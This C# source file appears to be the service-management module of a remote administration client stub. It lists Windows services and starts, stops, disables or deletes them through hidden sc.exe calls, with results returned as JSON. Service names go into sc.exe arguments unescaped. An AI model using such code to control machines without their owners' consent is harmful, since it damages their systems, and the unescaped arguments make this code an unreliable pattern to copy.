using Microsoft.Win32;
using System.Diagnostics;
using System.Text.Json;

namespace SeroStub;

internal static class ServiceManagerFeature
{
    internal static string GetList()
    {
        var list = new List<ServiceEntryStub>();

        // Registry gives Unicode display names — no encoding issues
        try
        {
            using var servicesKey = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Services");
            if (servicesKey != null)
            {
                foreach (var name in servicesKey.GetSubKeyNames())
                {
                    try
                    {
                        using var svcKey = servicesKey.OpenSubKey(name);
                        if (svcKey == null) continue;

                        // Only Win32 services (type 16 = own process, 32 = shared process)
                        var typeObj = svcKey.GetValue("Type");
                        if (typeObj == null) continue;
                        int svcType = Convert.ToInt32(typeObj);
                        if (svcType != 16 && svcType != 32) continue;

                        var displayName = svcKey.GetValue("DisplayName")?.ToString() ?? name;
                        if (displayName.StartsWith('@')) displayName = name;

                        var description = svcKey.GetValue("Description")?.ToString() ?? "";
                        if (description.StartsWith('@')) description = "";

                        var logOnAs  = svcKey.GetValue("ObjectName")?.ToString() ?? "";
                        var startObj = svcKey.GetValue("Start");
                        var startType = Convert.ToInt32(startObj ?? 3) switch
                        {
                            2 => "Auto",
                            4 => "Disabled",
                            _ => "Manual"
                        };

                        list.Add(new ServiceEntryStub
                        {
                            Name        = name,
                            DisplayName = displayName,
                            Description = description,
                            LogOnAs     = logOnAs,
                            StartType   = startType,
                            Status      = "Stopped"
                        });
                    }
                    catch { }
                }
            }
        }
        catch { }

        // Running status via sc.exe — SERVICE_NAME lines are pure ASCII, no encoding issue
        try
        {
            using var p = Process.Start(new ProcessStartInfo("sc.exe", "query type= all state= running")
            {
                CreateNoWindow = true, UseShellExecute = false,
                RedirectStandardOutput = true,
                StandardOutputEncoding = System.Text.Encoding.ASCII
            });
            var output = p?.StandardOutput.ReadToEnd() ?? "";
            var running = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
            foreach (var rawLine in output.Split('\n'))
            {
                var line = rawLine.Trim();
                if (line.StartsWith("SERVICE_NAME:", StringComparison.OrdinalIgnoreCase))
                    running.Add(line[13..].Trim());
            }
            foreach (var e in list)
                if (running.Contains(e.Name)) e.Status = "Running";
        }
        catch { }

        list.Sort((a, b) => string.Compare(
            a.DisplayName.Length > 0 ? a.DisplayName : a.Name,
            b.DisplayName.Length > 0 ? b.DisplayName : b.Name,
            StringComparison.OrdinalIgnoreCase));

        return JsonSerializer.Serialize(new SvcListResultStub { Services = list }, SeroJson.Default.SvcListResultStub);
    }

    internal static string DoAction(string action, string serviceName)
    {
        try
        {
            var result = action switch
            {
                "start"   => RunSc($"start \"{serviceName}\""),
                "stop"    => RunSc($"stop \"{serviceName}\""),
                "restart" => RunSc($"stop \"{serviceName}\"") + RunSc($"start \"{serviceName}\""),
                "disable" => RunSc($"config \"{serviceName}\" start= disabled"),
                "delete"  => RunSc($"delete \"{serviceName}\""),
                _          => ""
            };
            var ok = !result.Contains("FAILED") && !result.Contains("error", StringComparison.OrdinalIgnoreCase);
            return JsonSerializer.Serialize(new SvcAckStub { Success = ok, Error = ok ? "" : result.Trim() }, SeroJson.Default.SvcAckStub);
        }
        catch (Exception ex)
        {
            return JsonSerializer.Serialize(new SvcAckStub { Success = false, Error = ex.Message }, SeroJson.Default.SvcAckStub);
        }
    }

    private static string RunSc(string args)
    {
        try
        {
            using var p = Process.Start(new ProcessStartInfo("sc.exe", args)
            {
                CreateNoWindow = true, UseShellExecute = false,
                RedirectStandardOutput = true,
                StandardOutputEncoding = System.Text.Encoding.ASCII
            });
            return p?.StandardOutput.ReadToEnd() ?? "";
        }
        catch { return ""; }
    }
}
